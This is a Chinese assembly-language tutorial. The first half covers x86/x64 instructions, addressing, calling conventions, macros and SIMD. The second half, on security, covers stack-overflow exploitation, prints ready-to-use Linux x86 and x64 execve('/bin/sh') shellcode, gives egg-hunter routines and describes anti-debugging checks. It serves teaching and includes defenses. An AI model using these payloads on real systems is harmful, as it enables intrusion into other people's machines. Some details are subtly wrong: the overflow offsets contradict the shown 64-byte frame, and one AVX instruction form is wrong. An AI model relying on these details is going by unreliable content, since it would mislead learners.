## 一、进阶语法知识

### 1.1 x86/x64 指令集深入

```nasm
; ===== 数据传送指令 =====
section .text
global _start

_start:
    ; MOV - 基本传送
    mov eax, 0x12345678      ; 立即数到寄存器
    mov ebx, eax              ; 寄存器到寄存器
    mov [var], eax            ; 寄存器到内存
    mov eax, [var]            ; 内存到寄存器

    ; MOVZX - 零扩展传送（无符号）
    mov al, 0xFF              ; al = 0xFF
    movzx eax, al             ; eax = 0x000000FF

    ; MOVSX - 符号扩展传送（有符号）
    mov al, 0xFF              ; al = 0xFF (-1)
    movsx eax, al             ; eax = 0xFFFFFFFF

    ; XCHG - 交换
    xchg eax, ebx             ; 交换 eax 和 ebx
    xchg [var], eax           ; 交换内存和寄存器（原子操作）

    ; PUSH/POP - 栈操作
    push eax                  ; 压栈
    push 0x1234               ; 立即数压栈
    pop ebx                   ; 弹栈
    pushad                    ; 压入所有通用寄存器 (x86)
    popad                     ; 弹出所有通用寄存器 (x86)
    pushfd                    ; 压入标志寄存器
    popfd                     ; 弹出标志寄存器

    ; LEA - 加载有效地址（计算地址，不访问内存）
    lea eax, [ebx + ecx*4 + 0x10]  ; eax = ebx + ecx*4 + 16
    ; LEA 常用于数学运算，比 MUL 快

; ===== 算术运算指令 =====
arithmetic_ops:
    ; ADD/SUB
    add eax, ebx              ; eax += ebx
    sub eax, 10               ; eax -= 10
    inc eax                   ; eax++ （不改变 CF）
    dec eax                   ; eax--

    ; ADC/SBB - 带进位加减
    ; 64位加法（32位模式下）
    add eax, ebx              ; 低32位相加
    adc edx, ecx              ; 高32位相加（带进位）

    ; MUL/IMUL - 乘法
    mov eax, 10
    mov ebx, 20
    mul ebx                   ; eax * ebx = edx:eax （无符号）
    imul ebx                  ; 有符号乘法

    ; DIV/IDIV - 除法
    mov eax, 100
    mov edx, 0                ; 高32位必须清零
    mov ebx, 7
    div ebx                   ; eax = 商, edx = 余数

    ; NEG - 取负
    neg eax                   ; eax = -eax

    ; CMP - 比较（等价于 SUB，但不修改操作数，只改标志位）
    cmp eax, ebx              ; 比较 eax 和 ebx
    jg greater                ; 如果大于就跳转

; ===== 逻辑运算指令 =====
logic_ops:
    and eax, ebx              ; 按位与
    or eax, ebx               ; 按位或
    xor eax, eax              ; 按位异或（清零常用技巧）
    not eax                   ; 按位取反

    ; TEST - 测试（等价于 AND，但不修改操作数）
    test eax, eax             ; 测试 eax 是否为 0
    jz zero                   ; 为零则跳转

; ===== 移位指令 =====
shift_ops:
    shl eax, 1                ; 逻辑左移（相当于 *2）
    shr eax, 1                ; 逻辑右移（相当于 /2，无符号）
    sar eax, 1                ; 算术右移（相当于 /2，有符号）

    shl eax, cl               ; 移位位数可用 CL 寄存器
    sal eax, 2                ; 与 SHL 相同（算术左移）

    ; ROL/ROR - 循环移位
    rol eax, 4                ; 循环左移4位
    ror eax, 4                ; 循环右移4位
    rcl eax, 1                ; 带进位循环左移
    rcr eax, 1                ; 带进位循环右移

; ===== 分支指令 =====
branch_ops:
    ; 无条件跳转
    jmp target                ; 直接跳转
    jmp eax                   ; 间接跳转（寄存器）
    jmp [table + ebx*4]       ; 间接跳转（内存）

    ; 条件跳转（根据标志位）
    je equal                  ; ZF=1 相等/零
    jne not_equal             ; ZF=0 不等/非零
    jg greater                ; 大于（有符号）
    jge greater_equal         ; 大于等于（有符号）
    jl less                   ; 小于（有符号）
    jle less_equal            ; 小于等于（有符号）
    ja above                  ; 大于（无符号）
    jae above_equal           ; 大于等于（无符号）
    jb below                  ; 小于（无符号）
    jbe below_equal           ; 小于等于（无符号）
    jc carry                  ; CF=1 有进位
    jnc no_carry              ; CF=0 无进位
    js negative               ; SF=1 负数
    jns positive              ; SF=0 非负

    ; 循环指令
    mov ecx, 10
loop_start:
    ; ... 循环体 ...
    loop loop_start           ; ecx--, 如果 ecx!=0 则跳转

    ; 调用与返回
    call function             ; 调用函数（压返回地址，跳转）
    ret                       ; 返回（弹返回地址，跳转）
    ret 8                     ; 返回并弹出 8 字节参数

section .bss
var resd 1
```

### 1.2 寻址方式详解

```nasm
; ===== x86/x64 内存寻址方式 =====

section .data
    array   dd 10, 20, 30, 40, 50   ; 整数数组
    buffer  db 100 dup(0)           ; 100字节缓冲区
    table   dd func1, func2, func3  ; 函数指针表

section .text
global _start

_start:
    ; ===== 1. 直接寻址 =====
    mov eax, [array]          ; 直接使用地址/标号
    ; 等价于 mov eax, ds:array

    ; ===== 2. 寄存器间接寻址 =====
    mov ebx, array
    mov eax, [ebx]            ; ebx 中存储的地址指向的值

    ; ===== 3. 基址寻址 =====
    mov eax, [ebx + 16]       ; 基址 + 偏移量
    ; 常用于访问结构体成员
    ; struct { int a; int b; int c; }
    ; ebx = struct 地址
    ; [ebx+0] = a, [ebx+4] = b, [ebx+8] = c

    ; ===== 4. 变址寻址 =====
    mov esi, 2
    mov eax, [array + esi*4]  ; 数组基址 + 索引*比例因子
    ; array[esi] （每个元素4字节）

    ; ===== 5. 基址+变址寻址 =====
    mov ebx, array
    mov esi, 3
    mov eax, [ebx + esi*4]    ; 基址 + 索引*比例

    ; ===== 6. 基址+变址+偏移 =====
    mov eax, [ebx + esi*4 + 8]  ; 最完整的寻址方式

    ; ===== 比例因子 =====
    ; 可以是 1, 2, 4, 8
    ; [base + index*1]   - 字节数组 (char)
    ; [base + index*2]   - 字数组 (short)
    ; [base + index*4]   - 双字数组 (int, float)
    ; [base + index*8]   - 四字数组 (long long, double)

; ===== 寻址方式应用示例 =====
array_access:
    ; C 代码: int array[5]; return array[2];
    mov eax, [array + 2*4]    ; 直接计算偏移

    ; C 代码: int *p = &array[2]; return p[1];
    lea ebx, [array + 2*4]    ; ebx = &array[2]
    mov eax, [ebx + 1*4]      ; eax = p[1]

struct_access:
    ; 结构体示例:
    ; struct Person {
    ;   int age;          // 偏移 0
    ;   char name[20];    // 偏移 4
    ;   float height;     // 偏移 24
    ; };

    mov ebx, person_ptr       ; ebx = 结构体指针

    mov eax, [ebx + 0]        ; age (4字节)
    lea ecx, [ebx + 4]        ; name 数组首地址
    fld dword [ebx + 24]      ; height (float)

function_pointer_table:
    ; 跳转表/函数指针表
    mov eax, index            ; 索引
    jmp [table + eax*4]       ; 跳转到对应的函数

func1:
    ; ...
func2:
    ; ...
func3:
    ; ...

; ===== x64 新增寻址特性 =====
; x64 支持 RIP 相对寻址
x64_rip_relative:
    ; 位置无关代码 (PIC) 常用
    lea rax, [rel buffer]     ; RIP 相对寻址
    mov eax, [rel array]

    ; 通用寄存器更多：rax, rbx, rcx, rdx, rsi, rdi, rbp, rsp
    ;              r8-r15
    ; 可以用任何寄存器做基址/变址
    lea rax, [r10 + r11*8]    ; 使用 r10, r11
```

### 1.3 函数调用约定

```nasm
; ===== 常见调用约定对比 =====
;
; 约定      参数传递                     返回值    谁清理栈  平台
; --------  ---------------------------  -------  -------  ---------
; cdecl     栈（右到左）                 eax       调用者    C默认
; stdcall   栈（右到左）                 eax       被调用者  Win32 API
; fastcall  ecx, edx, 然后栈             eax       被调用者  优化
; thiscall  ecx=this, 其余栈             eax       被调用者  C++
; x64       rcx, rdx, r8, r9, 然后栈     rax       调用者    x64
; syscall   rdi, rsi, rdx, r10, r8, r9   rax       -        Linux x64

; ===== cdecl 调用约定（C 默认）=====
; 特点：调用者清理栈，参数右到左压栈
; C 函数: int add(int a, int b, int c) { return a+b+c; }

cdecl_example:
    ; 调用 add(1, 2, 3)
    push 3                    ; 参数 3 先压（最右边）
    push 2                    ; 参数 2
    push 1                    ; 参数 1 最后压（最左边）
    call add_cdecl            ; 调用函数
    add esp, 12               ; 调用者清理栈（3个参数 * 4字节）

add_cdecl:
    push ebp
    mov ebp, esp
    mov eax, [ebp + 8]        ; 参数 1 (a)
    add eax, [ebp + 12]       ; + 参数 2 (b)
    add eax, [ebp + 16]       ; + 参数 3 (c)
    pop ebp
    ret                       ; cdecl: 被调用者不清理栈

; ===== stdcall 调用约定 =====
; 特点：被调用者清理栈（Windows API 常用）
stdcall_example:
    push 3
    push 2
    push 1
    call add_stdcall          ; 调用后不需要 add esp
    ; 栈已经被函数自己清理了

add_stdcall:
    push ebp
    mov ebp, esp
    mov eax, [ebp + 8]
    add eax, [ebp + 12]
    add eax, [ebp + 16]
    pop ebp
    ret 12                    ; stdcall: 返回并弹出 12 字节

; ===== fastcall 调用约定 =====
; 特点：前两个参数用 ecx, edx，其余压栈
fastcall_example:
    push 3                    ; 第三个参数压栈
    mov edx, 2                ; 第二个参数 -> edx
    mov ecx, 1                ; 第一个参数 -> ecx
    call add_fastcall

add_fastcall:
    ; ecx = a, edx = b, [esp+4] = c
    mov eax, ecx
    add eax, edx
    add eax, [esp + 4]
    ret 4                     ; 清理栈上的参数

; ===== x64 调用约定（Microsoft x64）=====
; 前4个参数：rcx, rdx, r8, r9
; 更多参数：栈（从右到左）
; 返回值：rax
; 调用者负责分配 32 字节的"影子空间"（shadow space）

x64_ms_example:
    ; 调用 func(1, 2, 3, 4, 5)
    sub rsp, 40               ; 32字节影子空间 + 8字节对齐
    mov rcx, 1                ; 参数1
    mov rdx, 2                ; 参数2
    mov r8, 3                 ; 参数3
    mov r9, 4                 ; 参数4
    mov qword [rsp + 32], 5   ; 参数5 -> 栈
    call func_x64
    add rsp, 40               ; 恢复栈

func_x64:
    ; rcx = a, rdx = b, r8 = c, r9 = d
    ; [rsp+32] = e (第5个参数)
    mov rax, rcx
    add rax, rdx
    add rax, r8
    add rax, r9
    add rax, [rsp + 32]
    ret

; ===== System V AMD64 ABI (Linux/macOS) =====
; 前6个参数：rdi, rsi, rdx, rcx, r8, r9
; 更多参数：栈
; 返回值：rax

x64_linux_example:
    ; 调用 func(1, 2, 3, 4, 5, 6, 7)
    push 7                    ; 参数7 -> 栈
    mov r9, 6                 ; 参数6
    mov r8, 5                 ; 参数5
    mov rcx, 4                ; 参数4
    mov rdx, 3                ; 参数3
    mov rsi, 2                ; 参数2
    mov rdi, 1                ; 参数1
    call func_linux
    add rsp, 8                ; 清理栈参数

; ===== Linux x86 系统调用 =====
; 调用号 -> eax
; 参数：ebx, ecx, edx, esi, edi, ebp
; int 0x80 触发

linux_syscall_32:
    mov eax, 4                ; sys_write
    mov ebx, 1                ; stdout
    mov ecx, message          ; buffer
    mov edx, 13               ; length
    int 0x80                  ; 系统调用

; ===== Linux x64 系统调用 =====
; 调用号 -> rax
; 参数：rdi, rsi, rdx, r10, r8, r9
; syscall 触发

linux_syscall_64:
    mov rax, 1                ; sys_write (x64编号不同！)
    mov rdi, 1                ; stdout
    mov rsi, message          ; buffer
    mov rdx, 13               ; length
    syscall                   ; 系统调用

section .data
message db "Hello World!", 0xA
```

### 1.4 栈帧结构与 prologue/epilogue

```nasm
; ===== 标准栈帧结构 (x86) =====
;
; 高地址
;      +----------------+
;      |   参数 N       |
;      +----------------+
;      |   ...          |
;      +----------------+
;      |   参数 2       |
;      +----------------+
;      |   参数 1       |  <- EBP + 8
;      +----------------+
;      |   返回地址     |  <- EBP + 4
;      +----------------+
;      |   旧 EBP       |  <- EBP (栈帧基址指针)
;      +----------------+
;      |   局部变量 1    |  <- EBP - 4
;      +----------------+
;      |   局部变量 2    |  <- EBP - 8
;      +----------------+
;      |   ...          |
;      +----------------+
;      |                |  <- ESP (栈顶指针)
; 低地址

; ===== 标准函数序言 (Prologue) =====
standard_prologue:
    push ebp                  ; 保存旧的 EBP
    mov ebp, esp              ; EBP = 当前 ESP（建立栈帧基址）
    sub esp, 32               ; 分配 32 字节局部变量空间
    push ebx                  ; 保存被调用者保存寄存器
    push esi
    push edi

    ; 函数体...

; ===== 标准函数尾声 (Epilogue) =====
standard_epilogue:
    pop edi                   ; 恢复寄存器
    pop esi
    pop ebx
    mov esp, ebp              ; 释放局部变量空间
    pop ebp                   ; 恢复旧的 EBP
    ret                       ; 返回

; ===== 帧指针省略 (FPO) =====
; 现代编译器在优化时可能省略 EBP 栈帧
; 直接用 ESP 访问局部变量和参数
fpo_function:
    ; 没有 push ebp / mov ebp, esp
    sub esp, 16               ; 分配局部变量

    mov [esp + 0], eax        ; 局部变量 1 (esp+0)
    mov [esp + 4], ebx        ; 局部变量 2 (esp+4)

    ; 访问参数需要考虑栈上的返回地址
    mov eax, [esp + 16]       ; 参数 1 (esp + 局部变量 + 返回地址)
    add eax, [esp + 20]       ; 参数 2

    add esp, 16               ; 恢复栈
    ret

; ===== x64 栈帧 =====
; x64 下栈必须 16 字节对齐
x64_prologue:
    push rbp
    mov rbp, rsp
    sub rsp, 32               ; 32 字节影子空间（Microsoft x64）
    ; 额外局部变量空间
    sub rsp, 16               ; 16 字节额外空间（保持对齐）

    ; ...

x64_epilogue:
    mov rsp, rbp
    pop rbp
    ret

; ===== 叶子函数优化 =====
; 不调用其他函数的函数叫"叶子函数"
; 可以不保存返回地址，甚至不建立栈帧
leaf_function:
    ; 简单函数，不调用其他函数
    ; 可以直接使用寄存器，不需要栈帧
    add eax, ebx
    imul eax, ecx
    ret

; ===== alloca - 动态栈分配 =====
; 在栈上动态分配内存（类似 malloc 但更快，自动释放）
dynamic_stack_alloc:
    push ebp
    mov ebp, esp

    ; 需要分配 N 字节栈空间
    mov eax, [ebp+8]           ; size 参数
    add eax, 15                ; 16 字节对齐
    and eax, ~15
    sub esp, eax               ; ESP -= size (对齐后)
    mov eax, esp               ; 返回指针在 eax

    ; 使用分配的内存...

    mov esp, ebp               ; 函数返回时自动释放
    pop ebp
    ret
```

### 1.5 宏与条件汇编

```nasm
; ===== NASM 宏 =====

; 简单宏
%define SYS_EXIT 1
%define SYS_WRITE 4
%define STDOUT 1

; 带参数的宏
%macro PRINT 2                    ; 2 个参数
    pusha
    mov eax, SYS_WRITE
    mov ebx, STDOUT
    mov ecx, %1                   ; 参数 1: 字符串地址
    mov edx, %2                   ; 参数 2: 长度
    int 0x80
    popa
%endmacro

; 使用宏
print_hello:
    PRINT msg, msg_len

; ===== 多行宏 =====
%macro PROLOGUE 1                  ; 1 个参数：局部变量大小
    push ebp
    mov ebp, esp
    sub esp, %1
%endmacro

%macro EPILOGUE 0
    mov esp, ebp
    pop ebp
    ret
%endmacro

; 使用
my_function:
    PROLOGUE 32                    ; 32 字节局部变量

    ; ... 函数体 ...

    EPILOGUE

; ===== 条件汇编 =====
%define DEBUG 1

%if DEBUG
    ; 调试版代码
    PRINT debug_msg, debug_len
%endif

%ifidn __OUTPUT_FORMAT__, elf64
    ; 64 位 ELF 格式
    %define SYS_WRITE 1
    %define SYSCALL syscall
%elifidn __OUTPUT_FORMAT__, elf32
    ; 32 位 ELF 格式
    %define SYS_WRITE 4
    %define SYSCALL int 0x80
%else
    %error "Unsupported output format"
%endif

; ===== 重复宏 =====
; 生成 10 个 NOP
%assign i 0
%rep 10
    nop
    %assign i i + 1
%endrep

; 生成跳转表
%assign i 0
%macro JUMP_TABLE_ENTRY 1
    dd func_%1
    %assign i i + 1
%endmacro

section .data
jump_table:
    %rep 5
        JUMP_TABLE_ENTRY i
    %endrep

; 等价于：
; dd func_0, func_1, func_2, func_3, func_4

; ===== 宏中的局部标签 =====
%macro LOOP_N_TIMES 1
    %%start:                     ; %% 表示宏局部标签
    dec ecx
    jnz %%start
%endmacro

; 每次展开宏都会生成不同的标签名，避免重名

; ===== Include 文件 =====
; %include "system.inc"
; %include "macros.inc"

; ===== 条件汇编：检测 CPU 特性 =====
%macro CHECK_CPU_FEATURE 0
    ; 检测 CPU 是否支持 SSE2
    mov eax, 1
    cpuid
    test edx, 1 << 26            ; SSE2 bit
    jz %%no_sse2
    ; SSE2 可用
    jmp %%done
%%no_sse2:
    ; SSE2 不可用
%%done:
%endmacro
```

### 1.6 FPU/SSE/AVX 指令

```nasm
; ===== FPU (x87) 浮点指令 =====
; FPU 有 8 个寄存器：ST(0) ~ ST(7)
; 栈式结构，ST(0) 是栈顶

fpu_basics:
    ; 加载数据
    fld dword [float_val]       ; 压入 32 位浮点
    fld qword [double_val]      ; 压入 64 位浮点
    fldz                         ; 压入 0.0
    fld1                         ; 压入 1.0

    ; 存储数据
    fst dword [result]          ; 存储 ST(0)，不弹出
    fstp dword [result]         ; 存储并弹出

    ; 算术运算
    fadd dword [x]              ; ST(0) += x
    fsub dword [x]              ; ST(0) -= x
    fmul dword [x]              ; ST(0) *= x
    fdiv dword [x]              ; ST(0) /= x

    ; 比较
    fcom dword [x]              ; 比较 ST(0) 和 x
    fstsw ax                     ; 存储状态字到 AX
    sahf                         ; 复制到标志寄存器
    jb less_than                 ; 现在可以用条件跳转

    ; 三角函数
    fsin                         ; 正弦
    fcos                         ; 余弦
    fptan                        ; 正切

    ; 其他
    fsqrt                        ; 平方根
    fabs                         ; 绝对值
    fchs                         ; 改变符号
    fscale                       ; 乘以 2^ST(1)

    ; 整数转换
    fiadd dword [int_val]       ; 加整数
    fild dword [int_val]        ; 加载整数（转浮点）
    fistp dword [int_result]    ; 存为整数（截断）

    ; ST(0) 与 ST(1) 交换
    fxch st1                     ; 交换 st0 和 st1

; ===== SSE 指令 =====
; 128 位 XMM 寄存器（xmm0-xmm7 32位, xmm0-xmm15 64位）

sse_basics:
    ; 加载/存储
    movaps xmm0, [vec1]         ; 对齐加载 4 个 float
    movups xmm1, [vec2]         ; 不对齐加载
    movaps [result], xmm0       ; 存储

    ; 算术运算（4 个 float 同时计算）
    addps xmm0, xmm1            ; 加法 (Packed Single)
    subps xmm0, xmm1            ; 减法
    mulps xmm0, xmm1            ; 乘法
    divps xmm0, xmm1            ; 除法
    sqrtps xmm0, xmm1           ; 平方根

    ; 标量运算（只处理最低位 float）
    addss xmm0, xmm1            ; 标量加法 (Scalar Single)
    mulss xmm0, xmm1            ; 标量乘法

    ; 比较
    cmpps xmm0, xmm1, 0         ; 等于比较（0=EQ, 1=LT, 2=LE...）

    ; 数据搬移
    movss xmm0, xmm1            ; 搬移低 32 位
    shufps xmm0, xmm1, 0x4E     ; 重排 (立即数指定顺序)

    ; 整数 SSE (SSE2)
    movdqa xmm0, [int_vec]      ; 对齐加载整数向量
    paddd xmm0, xmm1            ; 4 个 int 相加
    pcmpgtd xmm0, xmm1          ; 4 个 int 比较大于

; ===== SSE2 双精度 =====
sse2_double:
    ; 2 个 double 同时计算
    movapd xmm0, [dvec1]        ; 2 个 double
    addpd xmm0, xmm1            ; 加法
    mulpd xmm0, xmm1            ; 乘法

    addsd xmm0, xmm1            ; 标量 double 加法

; ===== AVX 指令（256位）=====
; YMM 寄存器（ymm0-ymm7/ymm15）
; 支持 8 个 float 或 4 个 double 同时计算

avx_basics:
    ; 8 个 float 同时计算
    vmovaps ymm0, [vec8]        ; 8 个 float
    vaddps ymm0, ymm1, ymm2     ; 三操作数形式
    vmulps ymm0, ymm1, ymm2

    ; 4 个 double
    vaddpd ymm0, ymm1, ymm2

    ; 混合运算（FMA - 融合乘加）
    ; a = a * b + c  一条指令完成
    vfmaddps ymm0, ymm1, ymm2

    ; 注意：AVX 需要 CPU 支持
    ; 检测方法：CPUID
    ; bit AVX: CPUID.1:ECX.AVX[bit 28]

section .data
float_val   dd 3.14
double_val  dq 2.71828
int_val     dd 42
result      dd 0
vec1        dd 1.0, 2.0, 3.0, 4.0
vec2        dd 5.0, 6.0, 7.0, 8.0
dvec1       dq 1.0, 2.0
```

## 二、安全相关使用案例

### 2.1 栈溢出利用原理

```nasm
; ===== 栈溢出基本原理 =====
;
; 以下是易受攻击的 C 代码：
; void vulnerable(char *input) {
;     char buffer[64];
;     strcpy(buffer, input);
; }
;
; 对应的汇编大致如下：

vulnerable_function:
    push ebp
    mov ebp, esp
    sub esp, 64                ; 分配 64 字节缓冲区

    ; 调用 strcpy(buffer, input)
    push dword [ebp + 8]       ; 参数 input
    lea eax, [ebp - 64]        ; buffer 地址
    push eax                   ; 参数 buffer
    call strcpy
    add esp, 8

    mov esp, ebp
    pop ebp
    ret

; ===== 栈布局 =====
;
; 高地址
;   ...
;   +----------------+ <- EBP + 8: input 参数
;   |   input 指针   |
;   +----------------+ <- EBP + 4: 返回地址
;   |   返回地址     |
;   +----------------+ <- EBP
;   |   旧 EBP       |
;   +----------------+ <- EBP - 4
;   |                |
;   |   buffer[64]   |
;   |                |
;   +----------------+ <- ESP
; 低地址
;
; 当输入超过 64 字节时：
; - 72-76 字节：覆盖旧 EBP
; - 76-80 字节：覆盖返回地址 ← 攻击者控制的目标

; ===== 控制 EIP =====
; 攻击者构造输入：
; [填充 76 字节][目标地址]
; 当函数返回时，EIP 被设置为目标地址

; ===== 跳转位置选择 =====
;
; 方案1：跳转到 shellcode
;   - 需要缓冲区可执行
;   - 需要知道缓冲区地址
;
; 方案2：返回至 libc (ret2libc)
;   - 跳转到 system() 函数
;   - 参数指向 "/bin/sh"
;   - 不需要可执行栈
;
; 方案3：ROP (Return-Oriented Programming)
;   - 利用已有的代码片段（gadget）
;   - 绕过 NX/DEP 保护
;
; 方案4：JMP ESP
;   - 找一条 jmp esp / call esp 的指令
;   - shellcode 放在返回地址后面
;   - 适合地址不固定但有固定 DLL 的情况

; ===== JMP ESP 技术示例 =====
;
; 假设在某个 DLL 中找到了 jmp esp 指令，地址为 0x7c823456
;
; 输入结构：
; [76 字节填充][0x7c823456][shellcode...]
;
; 执行流程：
; 1. ret 弹出返回地址 -> EIP = 0x7c823456
; 2. 执行 jmp esp -> 跳转到 ESP 指向的位置
; 3. ESP 正好指向返回地址后面的 shellcode
; 4. shellcode 开始执行

; ===== 绕过 ASLR 的技巧（基础）=====
;
; 1. 信息泄露：先泄露某个地址，计算基址
; 2. 部分覆盖：只覆盖返回地址的低 2 字节
; 3. 利用不随机化的区域：.text 段在某些情况下不随机
; 4. Brute force：32 位下暴力破解（2^16 种可能）

; ===== 栈溢出防御 =====
;
; 1. Stack Canary (栈保护)
;    - 在返回地址前放一个随机值
;    - 返回前检查是否被修改
;
; 2. ASLR (地址空间随机化)
;    - 栈、堆、库的地址随机化
;
; 3. DEP/NX (数据执行保护)
;    - 栈上的数据不能执行
;
; 4. SafeSEH / SEHOP
;    - 保护异常处理链
;
; 5. CFG (控制流防护)
;    - 验证间接跳转目标

; 注意：以上内容仅用于学习研究
; 实际漏洞利用需要结合具体环境调试
```

### 2.2 Shellcode 编写

```nasm
; ===== Linux x86 execve("/bin/sh") Shellcode =====
; 系统调用号：execve = 11
; 参数：ebx=path, ecx=argv, edx=envp

section .text
global _start

; 方法1：经典方法
linux_x86_shellcode_v1:
    xor eax, eax               ; 清零
    push eax                   ; 压入 NULL 作为字符串结束符
    push 0x68732f2f            ; "//sh" (注意小端序)
    push 0x6e69622f            ; "/bin"
    mov ebx, esp               ; ebx = "/bin//sh" 地址

    push eax                   ; NULL
    push ebx                   ; 字符串地址
    mov ecx, esp               ; ecx = argv 数组

    xor edx, edx               ; envp = NULL

    mov al, 11                 ; execve 系统调用号
    int 0x80                   ; 触发系统调用

; 方法2：更短的版本（23字节）
linux_x86_shellcode_v2:
    ; 使用 cdq 清零 edx（eax 为正时 cdq 使 edx=0）
    xor eax, eax
    cdq                        ; edx = 0

    push eax
    push 0x68732f2f
    push 0x6e69622f
    mov ebx, esp

    push edx
    push ebx
    mov ecx, esp

    mov al, 11
    int 0x80

; ===== Linux x64 execve("/bin/sh") Shellcode =====
; 系统调用号：execve = 59
; 参数：rdi=path, rsi=argv, rdx=envp

linux_x64_shellcode:
    xor rax, rax
    push rax
    mov rbx, 0x68732f2f6e69622f ; "/bin//sh" (小端)
    push rbx
    mov rdi, rsp               ; rdi = path

    push rax                   ; NULL
    push rdi                   ; path
    mov rsi, rsp               ; rsi = argv

    cdq                        ; rdx = 0 (rax 为正)

    mov al, 59                 ; execve
    syscall

; ===== Windows MessageBox Shellcode 示例 =====
; (仅作原理说明，实际更复杂)

windows_msgbox_shellcode_principles:
    ; Windows shellcode 编写步骤：
    ; 1. 找到 kernel32.dll 基址
    ;    - 通过 PEB (Process Environment Block)
    ;    - fs:[0x30] -> PEB
    ;    - PEB+0x0C -> PEB_LDR_DATA
    ;    - 遍历模块链表找到 kernel32
    ;
    ; 2. 解析 PE 导出表
    ;    - 找到 GetProcAddress 地址
    ;    - 用 GetProcAddress 找其他函数
    ;
    ; 3. 调用函数
    ;    - LoadLibrary("user32.dll")
    ;    - GetProcAddress("MessageBoxA")
    ;    - MessageBoxA(0, text, title, 0)

; ===== 无 null 字节 Shellcode =====
; 很多情况下 shellcode 不能包含 null 字节
; （比如 strcpy 会被 \x00 截断）

bad_example_with_null:
    mov eax, 1                 ; 有 null 字节：b8 01 00 00 00
    mov ebx, 0x12345678        ; 无 null
    push 0                     ; 有 null 字节

good_example_no_null:
    xor eax, eax               ; 无 null：31 c0
    mov al, 1                  ; 无 null：b0 01
    cdq                        ; 无 null：99 (edx=0)
    xor ebx, ebx               ; 清零
    mov bx, 0x1234             ; 只赋值低 16 位

; ===== 自定位 Shellcode =====
; shellcode 通常不知道自己在内存中的位置
; 常用技巧：call/pop

self_locating:
    call get_eip               ; call 会把下一条指令地址压栈
get_eip:
    pop eax                    ; eax = 当前指令地址（eip）

    ; 现在 eax 保存了当前地址
    ; 可以用它来计算其他数据的偏移
    lea ebx, [eax + (data - get_eip)]
    ; ebx = data 标签的实际地址

    ret

data:
    db "Hello", 0

; ===== 测试 Shellcode =====
; C 语言测试框架：
;
; char shellcode[] = "\x31\xc0\x...";
; int (*f)() = (int(*)())shellcode;
; f();
;
; 编译时需要关闭 DEP：
; gcc -z execstack test.c -o test
; 或使用 mmap 分配可执行内存
```

### 2.3 Egg Hunter 技术

```nasm
; ===== Egg Hunter 原理 =====
;
; 当缓冲区太小，放不下完整的 shellcode 时：
; 1. 将大的 shellcode（egg）放在内存的某个位置
; 2. 在小缓冲区中放一个小程序（egg hunter）
; 3. egg hunter 在内存中搜索 egg（唯一标识）
; 4. 找到后跳过去执行完整 shellcode
;
; egg 一般是 8 字节，如："W00TW00T"
; egg hunter 逐页搜索内存，找到 egg 就跳转到 egg 后面

; ===== 方法1：access 系统调用方法 =====
; 利用 access() 检查内存页是否可读
; 避免访问非法内存导致段错误

egghunter_access:
    ; egg = "W00T" (0x54303057)
    ; 我们搜索两个连续的 egg

    mov ebx, 0x54303057        ; egg 值
    xor ecx, ecx               ; 起始地址 0
    mov edx, 0x1000             ; 页面大小

next_page:
    or dx, 0xfff                ; 页内最后一个偏移

next_byte:
    inc edx                     ; 下一页起始

    ; access(addr, 0) - 检查地址是否可读
    pusha
    mov ebx, edx                ; addr
    xor ecx, ecx                ; mode = F_OK (0)
    xor eax, eax
    mov al, 33                  ; sys_access
    int 0x80
    popa

    cmp al, 0xf2                ; EFAULT = -14 = 0xf2 (低8位)
    jz next_page                ; 不可读，跳到下一页

    ; 检查第一个 egg
    cmp [edx], ebx
    jnz next_byte

    ; 检查第二个 egg（egg + 4）
    cmp [edx + 4], ebx
    jnz next_byte

    ; 找到了！edx 指向 egg
    add edx, 8                  ; 跳过 egg
    jmp edx                     ; 执行 shellcode

; ===== 方法2：sigaction 方法（更快）=====
; 利用 sigaction 检测无效地址

egghunter_sigaction:
    mov ebx, 0x54303057        ; egg
    xor ecx, ecx

next_page_s:
    or cx, 0xfff

next_byte_s:
    inc ecx

    ; sigaction
    pusha
    mov ebx, ecx
    xor ecx, ecx
    xor eax, eax
    mov al, 67                  ; sys_sigaction
    int 0x80
    popa

    cmp al, 0xf2
    jz next_page_s

    cmp [ecx], ebx
    jnz next_byte_s

    cmp [ecx + 4], ebx
    jnz next_byte_s

    add ecx, 8
    jmp ecx

; ===== Egg Hunter 使用示例 =====
;
; 小缓冲区（只能放 egghunter）：
; [padding][ret_addr][egghunter]
;
; 大缓冲区（放真正的 egg+shellcode）：
; "W00TW00T" + 真正的 shellcode
;
; 执行流程：
; 1. 溢出后跳转到 egghunter
; 2. egghunter 在内存中搜索 "W00TW00T"
; 3. 找到后跳转到后面的 shellcode
; 4. 执行完整 shellcode

; ===== 注意事项 =====
;
; 1. egg 必须是唯一的，避免误匹配
;    - 推荐 8 字节（两个重复的 4 字节标记）
;    - 自己的代码中不要包含 egg
;
; 2. 搜索方向
;    - 从低地址往高地址搜
;    - 或从高地址往低地址搜
;
; 3. 性能
;    - 32 位地址空间很大
;    - 通常按页搜索，跳过不可读页
;    - 实际搜索时间取决于 shellcode 位置
;
; 4. 适用场景
;    - 缓冲区太小，放不下完整 shellcode
;    - shellcode 位置不确定
;    - 有多个注入点（一个放 hunter，一个放 egg）
```

### 2.4 反调试技术

```nasm
; ===== 反调试技术 =====
; 恶意软件和受保护软件常用的反调试手段
; 注意：仅用于学习研究

; ===== 方法1：IsDebuggerPresent (Windows) =====
; 调用 kernel32!IsDebuggerPresent
; 返回值：eax = 1 表示被调试，0 表示未被调试

is_debugger_present:
    ; 假设已经获取了函数地址（存在 edi）
    call edi                   ; 调用 IsDebuggerPresent
    test eax, eax
    jnz debugging_detected     ; 非零表示被调试

debugging_detected:
    ; 检测到调试器，执行反制
    ; 比如：退出、破坏数据、执行假代码等
    ; ...

; ===== 方法2：CheckRemoteDebuggerPresent =====
; 可以检查其他进程是否被调试

check_remote_debugger:
    ; 类似方法1
    ; 参数：进程句柄, 结果指针
    ; BOOL CheckRemoteDebuggerPresent(
    ;   HANDLE hProcess,
    ;   PBOOL pbDebuggerPresent
    ; );

; ===== 方法3：PEB BeingDebugged 标志 =====
; PEB (Process Environment Block) 中有 BeingDebugged 字段
; fs:[0x30] 指向 PEB

peb_check:
    xor eax, eax
    mov eax, [fs:eax + 0x30]   ; eax = PEB 地址
    mov al, [eax + 2]          ; al = PEB->BeingDebugged
    test al, al
    jnz debugging_detected

; PEB 结构（部分）：
; +0x000 InheritedAddressSpace
; +0x001 ReadImageFileExecOptions
; +0x002 BeingDebugged        ← 就是这个
; +0x003 SpareBool
; +0x004 Mutant
; +0x008 ImageBaseAddress
; ...

